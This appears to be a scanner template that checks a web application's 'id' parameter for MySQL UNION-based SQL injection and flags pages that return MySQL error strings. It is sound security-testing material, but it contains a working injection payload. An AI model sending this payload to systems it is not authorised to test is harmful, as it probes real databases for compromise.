id: patt-sqli-mysql-union-03-id
name: 'PATT sqli patt-sqli-mysql-union-03 via id'
severity: high
type: active
tags:
  - sqli
  - patt
requires:
  - php
description: 'PATT MySQL UNION 3 kolom. [patt:patt-sqli-mysql-union-03] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/MySQL%20Injection.md]'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      id:
        - ''' UNION SELECT NULL, NULL, NULL-- -'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQL syntax'
          - 'mysql_fetch'
